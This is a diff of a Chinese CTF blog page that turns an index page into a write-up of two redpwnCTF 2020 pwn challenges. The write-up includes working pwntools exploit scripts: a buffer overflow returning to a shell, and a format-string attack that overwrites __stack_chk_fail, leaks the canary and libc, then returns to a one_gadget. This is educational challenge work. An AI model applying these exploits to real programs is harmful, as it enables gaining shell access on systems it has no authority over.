@@ -6,17 +6,22 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="https://qingmu-z.github.io">
-  <title>qingmu-z</title>
+  <title>redpwnctf 2020 pwn | qingmu-z</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="河南大学大一新生">
-<meta property="og:type" content="website">
-<meta property="og:title" content="qingmu-z">
-<meta property="og:url" content="https://qingmu-z.github.io/page/2/index.html">
+  <meta name="description" content="coffer-overflow-0dead-canary">
+<meta property="og:type" content="article">
+<meta property="og:title" content="redpwnctf 2020 pwn">
+<meta property="og:url" content="https://qingmu-z.github.io/2021/04/27/ctf%E6%AF%94%E8%B5%9B/redpwn2020/index.html">
 <meta property="og:site_name" content="qingmu-z">
-<meta property="og:description" content="河南大学大一新生">
+<meta property="og:description" content="coffer-overflow-0dead-canary">
 <meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2021-04-27T10:07:43.606Z">
+<meta property="article:modified_time" content="2021-04-27T10:09:02.019Z">
 <meta property="article:author" content="朱登榜">
-<meta property="article:tag" content="c++,二进制，leetcode,信息安全">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="格式化字符串">
+<meta property="article:tag" content="canary">
 <meta name="twitter:card" content="summary">
   
     <link rel="alternative" href="/atom.xml" title="qingmu-z" type="application/atom+xml">
@@ -224,24 +229,31 @@ color="0,0,255" opacity='0.9' zIndex="-1" count="300" src="//cdn.bootcss.com/can
           </div>
           <div id="js-content" class="content-ll">
             
-  
-    <article id="post-pwn/pwn srop" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+<article id="post-ctf比赛/redpwn2020" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/04/03/pwn/pwn%20srop/">pwn srop</a>
+    <h1 class="article-title" itemprop="name">
+      redpwnctf 2020 pwn
     </h1>
   
 
 <!--显示阅读次数-->
 
+  <br/>
+  <a class="cloud-tie-join-count" href="javascript:void(0);" style="color:gray;font-size:14px;">
+  <span class="icon-sort"></span>
+  <span id="busuanzi_container_page_pv" style="color:#ef7522;font-size:14px;">
+    阅读数: <span id="busuanzi_value_page_pv"></span>次 &nbsp;&nbsp;
+  </span>
+  </a>
+
 <!--显示阅读次数完毕-->
         
-        <a href="/2021/04/03/pwn/pwn%20srop/" class="archive-article-date">
-  	<time datetime="2021-04-03T15:12:48.130Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-04-03</time>
+        <a href="/2021/04/27/ctf%E6%AF%94%E8%B5%9B/redpwn2020/" class="archive-article-date">
+  	<time datetime="2021-04-27T10:07:43.606Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-04-27</time>
 </a>
         <!-- 需要添加的位置 -->
         <!-- 开始添加字数统计-->
@@ -251,7 +263,7 @@ color="0,0,255" opacity='0.9' zIndex="-1" count="300" src="//cdn.bootcss.com/can
       <span class="post-meta-item-icon">
         <i class="fa fa-keyboard-o"></i>
         <span class="post-meta-item-text" style="color:#ef7522;font-size:14px;">  字数统计: </span>
-        <span class="post-count" style="color:#ef7522;font-size:14px;">530字</span>
+        <span class="post-count" style="color:#ef7522;font-size:14px;">372字</span>
       </span>
     </span>
 
@@ -271,130 +283,59 @@ color="0,0,255" opacity='0.9' zIndex="-1" count="300" src="//cdn.bootcss.com/can
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>csicn_s_3<br>smallest</p>
-        
-          <a class="article-more-a" href="/2021/04/03/pwn/pwn%20srop/#more">more >></a>
-        
-      
+        <p>coffer-overflow-0<br>dead-canary</p>
+<a id="more"></a>
+<p>@<a href="%E7%9B%AE%E5%BD%95">TOC</a></p>
+<h1 id="coffer-overflow-0"><a href="#coffer-overflow-0" class="headerlink" title="coffer-overflow-0"></a>coffer-overflow-0</h1><p>第三道直接溢出返回到system(“/bin/sh”)就行了<br>前两道都是覆盖一个变量，或者和第三道一样，直接返回也可以</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">filename = <span class="string">&quot;coffer-overflow-0&quot;</span></span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=arch, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">content = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">offset = <span class="number">0</span></span><br><span class="line"><span class="comment"># elf</span></span><br><span class="line">elf = ELF(filename)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># libc</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">b</span>(<span class="params">addr</span>):</span></span><br><span class="line">    bk = <span class="string">&quot;b *&quot;</span> + <span class="built_in">str</span>(addr)</span><br><span class="line">    gdb.attach(io, bk)</span><br><span class="line">    success(<span class="string">&quot;attach&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">global</span> io</span><br><span class="line">    <span class="keyword">if</span> content == <span class="number">0</span>:</span><br><span class="line">        io = process(<span class="string">&quot;./&quot;</span> + filename)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io = remote(<span class="string">&quot;&quot;</span>)</span><br><span class="line">    payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x28</span>)+p64(<span class="number">0x00000000004006EE</span>)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line">    io.interactive()</span><br><span class="line">main()</span><br></pre></td></tr></table></figure>
 
-
-
-
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">pwn</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">ctf</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">srop</a>
-        		</li>
-      		
-		</ul>
-	</div>
+<h1 id="dead-canary"><a href="#dead-canary" class="headerlink" title="dead-canary"></a>dead-canary</h1><p>故意触发canary并且利用格式化字符串漏洞修改chk_fail函数ret2main，泄露canary和libc，再溢出到onegadget即可</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">filename = <span class="string">&quot;dead-canary&quot;</span></span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=arch, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">content = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">offset = <span class="number">0</span></span><br><span class="line"><span class="comment"># elf</span></span><br><span class="line">elf = ELF(filename)</span><br><span class="line">main_addr=<span class="number">0x0000000000400737</span></span><br><span class="line">__stack_chk_fail=elf.got[<span class="string">&#x27;__stack_chk_fail&#x27;</span>]</span><br><span class="line"><span class="comment"># libc</span></span><br><span class="line">libc=ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">ogg_libc=[<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf0364</span>,<span class="number">0xf1207</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">b</span>(<span class="params">addr</span>):</span></span><br><span class="line">    bk = <span class="string">&quot;b *$rebase&quot;</span> + <span class="built_in">str</span>(addr)</span><br><span class="line">    gdb.attach(io, bk)</span><br><span class="line">    success(<span class="string">&quot;attach&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">global</span> io</span><br><span class="line">    <span class="keyword">if</span> content == <span class="number">0</span>:</span><br><span class="line">        io = process(<span class="string">&quot;./&quot;</span> + filename)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io = remote(<span class="string">&quot;&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;What is your name: &quot;</span>)</span><br><span class="line">    gdb.attach(io,<span class="string">b&#x27;b read&#x27;</span>)</span><br><span class="line">    <span class="comment">#####leak_libc_ret_main#####</span></span><br><span class="line">    payload=<span class="string">b&#x27;%39$p%3$p%1815x%9$hnaaaa&#x27;</span></span><br><span class="line">    payload+=p64(__stack_chk_fail)</span><br><span class="line">    payload=payload.ljust(<span class="number">0x118</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Hello &quot;</span>)</span><br><span class="line">    canary=<span class="built_in">int</span>(io.recv(<span class="number">18</span>),<span class="number">16</span>)</span><br><span class="line">    write_addr=<span class="built_in">int</span>(io.recv(<span class="number">14</span>),<span class="number">16</span>)-<span class="number">0x10</span></span><br><span class="line">    io.recv()</span><br><span class="line">    print(<span class="string">&quot;canary:&quot;</span>, <span class="built_in">hex</span>(canary))</span><br><span class="line">    print(<span class="string">&quot;write_addr:&quot;</span>,<span class="built_in">hex</span>(write_addr))</span><br><span class="line">    <span class="comment">#####count#####</span></span><br><span class="line">    libcbase=write_addr-libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">    ogg_addr=libcbase+ogg_libc[<span class="number">0</span>]</span><br><span class="line">    <span class="comment">#####getshell######</span></span><br><span class="line">    payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x110</span>-<span class="number">0x8</span>)+p64(canary)+<span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span>+p64(ogg_addr)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line">    io.recv()</span><br><span class="line">    io.interactive()</span><br><span class="line">main()</span><br></pre></td></tr></table></figure>
 
       
 
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/04/03/pwn/pwn%20srop/">展开全文 >></a>
-        </p>
-      
 
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
+       
+         <div class="essayending">
+           <div>
+            <div style="text-align:center;color: #ccc;font-size:22px;">
+            <br/>
+            <br/>
+ -------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------
+            <br/>
+            <br/>
+             <br/>
+             <br/>
             </div>
+           </div>
+         </div>
+         
+
+  
+
+
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
         </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-pwn/pwn 堆入门之fastbin attack" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/04/02/pwn/pwn%20%E5%A0%86%E5%85%A5%E9%97%A8%E4%B9%8Bfastbin%20attack/">pwn 堆入门之fastbin attack</a>
-    </h1>
-  
-
-<!--显示阅读次数-->
-
-<!--显示阅读次数完毕-->
-        
-        <a href="/2021/04/02/pwn/pwn%20%E5%A0%86%E5%85%A5%E9%97%A8%E4%B9%8Bfastbin%20attack/" class="archive-article-date">
-  	<time datetime="2021-04-01T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-04-02</time>
-</a>
-        <!-- 需要添加的位置 -->
-        <!-- 开始添加字数统计-->
-        
-          <div style="margin-top:10px;">
-    <span class="post-time">
-      <span class="post-meta-item-icon">
-        <i class="fa fa-keyboard-o"></i>
-        <span class="post-meta-item-text" style="color:#ef7522;font-size:14px;">  字数统计: </span>
-        <span class="post-count" style="color:#ef7522;font-size:14px;">1.7k字</span>
-      </span>
-    </span>
-
-    <span class="post-time">
-      &nbsp; | &nbsp;
-      <span class="post-meta-item-icon">
-        <i class="fa fa-hourglass-half"></i>
-        <span class="post-meta-item-text" style="color:#ef7522;font-size:14px;">  阅读时长: </span>
-        <span class="post-count" style="color:#ef7522;font-size:14px;">9分</span>
-      </span>
-    </span>
-</div>
-          
-        <!-- 添加完成 -->
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>1.flow<br>2.oreo</p>
-        
-          <a class="article-more-a" href="/2021/04/02/pwn/pwn%20%E5%A0%86%E5%85%A5%E9%97%A8%E4%B9%8Bfastbin%20attack/#more">more >></a>
-        
-      
-
-
-
-
-
       
     </div>
     <div class="article-info article-info-index">
@@ -410,470 +351,6 @@ color="0,0,255" opacity='0.9' zIndex="-1" count="300" src="//cdn.bootcss.com/can
       		 
         		<li class="article-tag-list-item">
         			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">ctf</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">堆</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/04/02/pwn/pwn%20%E5%A0%86%E5%85%A5%E9%97%A8%E4%B9%8Bfastbin%20attack/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-pwn/pwn libc之Dynelf" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/03/28/pwn/pwn%20libc%E4%B9%8BDynelf/">pwn libc之Dynelf</a>
-    </h1>
-  
-
-<!--显示阅读次数-->
-
-<!--显示阅读次数完毕-->
-        
-        <a href="/2021/03/28/pwn/pwn%20libc%E4%B9%8BDynelf/" class="archive-article-date">
-  	<time datetime="2021-03-27T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-03-28</time>
-</a>
-        <!-- 需要添加的位置 -->
-        <!-- 开始添加字数统计-->
-        
-          <div style="margin-top:10px;">
-    <span class="post-time">
-      <span class="post-meta-item-icon">
-        <i class="fa fa-keyboard-o"></i>
-        <span class="post-meta-item-text" style="color:#ef7522;font-size:14px;">  字数统计: </span>
-        <span class="post-count" style="color:#ef7522;font-size:14px;">928字</span>
-      </span>
-    </span>
-
-    <span class="post-time">
-      &nbsp; | &nbsp;
-      <span class="post-meta-item-icon">
-        <i class="fa fa-hourglass-half"></i>
-        <span class="post-meta-item-text" style="color:#ef7522;font-size:14px;">  阅读时长: </span>
-        <span class="post-count" style="color:#ef7522;font-size:14px;">5分</span>
-      </span>
-    </span>
-</div>
-          
-        <!-- 添加完成 -->
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>pwn-100<br>pwn-200<br>welpwn</p>
-        
-          <a class="article-more-a" href="/2021/03/28/pwn/pwn%20libc%E4%B9%8BDynelf/#more">more >></a>
-        
-      
-
-
-
-
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">pwn</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">ctf</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">ret2libc</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/03/28/pwn/pwn%20libc%E4%B9%8BDynelf/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-jarvisoj/pwn" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/03/26/jarvisoj/pwn/">Jarvis OJ pwn</a>
-    </h1>
-  
-
-<!--显示阅读次数-->
-
-<!--显示阅读次数完毕-->
-        
-        <a href="/2021/03/26/jarvisoj/pwn/" class="archive-article-date">
-  	<time datetime="2021-03-26T09:28:10.359Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-03-26</time>
-</a>
-        <!-- 需要添加的位置 -->
-        <!-- 开始添加字数统计-->
-        
-          <div style="margin-top:10px;">
-    <span class="post-time">
-      <span class="post-meta-item-icon">
-        <i class="fa fa-keyboard-o"></i>
-        <span class="post-meta-item-text" style="color:#ef7522;font-size:14px;">  字数统计: </span>
-        <span class="post-count" style="color:#ef7522;font-size:14px;">830字</span>
-      </span>
-    </span>
-
-    <span class="post-time">
-      &nbsp; | &nbsp;
-      <span class="post-meta-item-icon">
-        <i class="fa fa-hourglass-half"></i>
-        <span class="post-meta-item-text" style="color:#ef7522;font-size:14px;">  阅读时长: </span>
-        <span class="post-count" style="color:#ef7522;font-size:14px;">4分</span>
-      </span>
-    </span>
-</div>
-          
-        <!-- 添加完成 -->
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>1.level1<br>2.level3<br>3.level3_x64<br>4.smashes<br>5.easystack（nepctf）<br>6.[签到] 送你一朵小红花 (nepctf)</p>
-        
-          <a class="article-more-a" href="/2021/03/26/jarvisoj/pwn/#more">more >></a>
-        
-      
-
-
-
-
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">pwn</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">ctf</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">Jarvis OJ</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">nepctf</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/03/26/jarvisoj/pwn/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-buu/buu pwn2" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/03/12/buu/buu%20pwn2/">buuctf pwn（2）</a>
-    </h1>
-  
-
-<!--显示阅读次数-->
-
-<!--显示阅读次数完毕-->
-        
-        <a href="/2021/03/12/buu/buu%20pwn2/" class="archive-article-date">
-  	<time datetime="2021-03-12T08:58:16.095Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-03-12</time>
-</a>
-        <!-- 需要添加的位置 -->
-        <!-- 开始添加字数统计-->
-        
-          <div style="margin-top:10px;">
-    <span class="post-time">
-      <span class="post-meta-item-icon">
-        <i class="fa fa-keyboard-o"></i>
-        <span class="post-meta-item-text" style="color:#ef7522;font-size:14px;">  字数统计: </span>
-        <span class="post-count" style="color:#ef7522;font-size:14px;">1.1k字</span>
-      </span>
-    </span>
-
-    <span class="post-time">
-      &nbsp; | &nbsp;
-      <span class="post-meta-item-icon">
-        <i class="fa fa-hourglass-half"></i>
-        <span class="post-meta-item-text" style="color:#ef7522;font-size:14px;">  阅读时长: </span>
-        <span class="post-count" style="color:#ef7522;font-size:14px;">6分</span>
-      </span>
-    </span>
-</div>
-          
-        <!-- 添加完成 -->
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>get_started_3dsctf_2016<br>not_the_same_3dsctf_2016<br>ciscn_2019_n_8<br>bjdctf_2020_babystack<br>one_gadget<br>baby_rop<br>level2_x64<br>ciscn_2019_n_5<br>2018_rop</p>
-        
-          <a class="article-more-a" href="/2021/03/12/buu/buu%20pwn2/#more">more >></a>
-        
-      
-
-
-
-
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">pwn</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">ctf</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">buu</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/03/12/buu/buu%20pwn2/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-pwn/pwn 格式化字符串漏洞" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/03/09/pwn/pwn%20%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/">pwn 格式化字符串漏洞</a>
-    </h1>
-  
-
-<!--显示阅读次数-->
-
-<!--显示阅读次数完毕-->
-        
-        <a href="/2021/03/09/pwn/pwn%20%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/" class="archive-article-date">
-  	<time datetime="2021-03-09T15:09:09.362Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-03-09</time>
-</a>
-        <!-- 需要添加的位置 -->
-        <!-- 开始添加字数统计-->
-        
-          <div style="margin-top:10px;">
-    <span class="post-time">
-      <span class="post-meta-item-icon">
-        <i class="fa fa-keyboard-o"></i>
-        <span class="post-meta-item-text" style="color:#ef7522;font-size:14px;">  字数统计: </span>
-        <span class="post-count" style="color:#ef7522;font-size:14px;">763字</span>
-      </span>
-    </span>
-
-    <span class="post-time">
-      &nbsp; | &nbsp;
-      <span class="post-meta-item-icon">
-        <i class="fa fa-hourglass-half"></i>
-        <span class="post-meta-item-text" style="color:#ef7522;font-size:14px;">  阅读时长: </span>
-        <span class="post-count" style="color:#ef7522;font-size:14px;">3分</span>
-      </span>
-    </span>
-</div>
-          
-        <!-- 添加完成 -->
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>PWN5 BUU<br>CGfsb 攻防世界</p>
-        
-          <a class="article-more-a" href="/2021/03/09/pwn/pwn%20%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/#more">more >></a>
-        
-      
-
-
-
-
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">pwn</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">ctf</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">buu</a>
         		</li>
       		 
         		<li class="article-tag-list-item">
@@ -881,7 +358,7 @@ color="0,0,255" opacity='0.9' zIndex="-1" count="300" src="//cdn.bootcss.com/can
         		</li>
       		 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">攻防世界</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">canary</a>
         		</li>
       		
 		</ul>
@@ -890,260 +367,75 @@ color="0,0,255" opacity='0.9' zIndex="-1" count="300" src="//cdn.bootcss.com/can
       
 
       
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/03/09/pwn/pwn%20%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/">展开全文 >></a>
-        </p>
-      
 
       
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
         
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
